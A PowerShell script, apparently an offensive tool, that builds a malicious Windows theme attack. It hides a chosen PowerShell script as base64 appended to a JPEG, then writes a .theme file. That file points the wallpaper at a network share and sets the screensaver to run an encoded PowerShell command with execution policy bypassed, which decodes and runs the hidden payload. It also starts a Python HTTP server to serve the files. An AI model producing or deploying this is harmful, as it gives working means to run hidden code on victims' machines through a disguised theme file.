# Create stenographic image

# Prompt the user for input files
$psScriptPath = Read-Host "Enter the path to the PowerShell script you want to encode"
$imagePath = Read-Host "Enter the path to the image file you want to use for steganography"
$outputFile = Read-Host "Enter the name for the output steganographic image (without extension)"

# Define the output directory
$outputDir = "C:\Users\$env:USERNAME\Documents\theme-attack"

# Create the output directory if it doesn't exist
If (-Not (Test-Path -Path $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory | Out-Null
}

# Encode the PowerShell script to Base64 using CertUtil
certutil -encode $psScriptPath encoded_script.txt

# Append the encoded script to the image using the proper syntax
& cmd /c "copy /b `"$imagePath`" + `"encoded_script.txt`" `"$outputDir\$outputFile.jpg`""

# Clean up temporary encoded file
Remove-Item encoded_script.txt

# The original PowerShell command
$psCommand = @"
$decodedContent = certutil -decode $outputDir\$outputFile.jpg stdout 2>&1 | Select-Object -Skip 1
Invoke-Expression -Command $decodedContent
"@

# Convert to Base64 (using UTF-16LE encoding, which PowerShell expects)
$bytes = [System.Text.Encoding]::Unicode.GetBytes($psCommand)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Output the Base64 encoded command
Write-Output $encodedCommand

# Prompt user for network location to store wallpaper
$networkLocation = Read-Host "Enter the network location for the wallpaper (e.g., \\192.168.1.103)"

# Define the contents of the theme file
$themeContent = @"
[Control Panel\Desktop]
Wallpaper=$networkLocation\$outputFile.jpg
TileWallpaper=0
WallpaperStyle=2
ScreenSaveTimeOut=5

[Control Panel\Screensaver]
SCRNSAVE.EXE=powershell.exe -ExecutionPolicy Bypass -EncodedCommand "$encodedCommand"
"@

# Specify the path where you want to save the theme file
$themeFilePath = "$outputDir\custom_theme.theme"

# Write the contents to the theme file
Set-Content -Path $themeFilePath -Value $themeContent

Write-Output "Theme file created at: $themeFilePath"
Write-Output "Image file created at: $outputDir\$outputFile.jpg"

# Change directory to the theme-attack folder
Set-Location -Path "C:\Users\$env:USERNAME\Documents\theme-attack"

# Start the Python HTTP server in the current directory
Start-Process -NoNewWindow -FilePath "python" -ArgumentList "-m http.server 8080"
